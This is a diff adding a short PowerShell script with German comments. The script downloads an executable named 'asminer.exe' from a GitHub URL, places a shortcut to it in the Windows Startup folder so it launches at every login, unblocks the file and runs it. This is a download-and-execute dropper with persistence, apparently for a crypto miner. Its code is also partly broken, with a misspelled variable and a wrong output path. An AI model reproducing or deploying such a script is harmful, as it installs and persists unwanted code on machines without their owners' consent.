@@ -1,0 +1,26 @@
+$startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\asminer.lnk")
+#$Path = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows")
+$Path = "C:\"
+$runpath = [System.IO.Path]::Combine($Path, "\asminer.exe")
+# URL der Datei, die heruntergeladen werden soll
+$url = "https://github.com/Lorcan84/test/raw/main/asminer.exe"
+
+# Pfad, wo die Datei gespeichert werden soll
+#$output = $Path
+
+# Herunterladen der Datei
+Invoke-WebRequest -Uri $url -OutFile $Path
+
+Write-Output "Datei wurde erfolgreich heruntergeladen und gespeichert unter $output"
+
+# COM-Objekt für das Erstellen der Verknüpfung
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut($startupPath)
+
+# Pfad und Argumente für die Verknüpfung setzen
+$shortcut.TargetPath = $runpath
+$shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($runath)
+$shortcut.Save()
+
+Unblock-File -Path $Path
+Start-Process -Filepath $Path
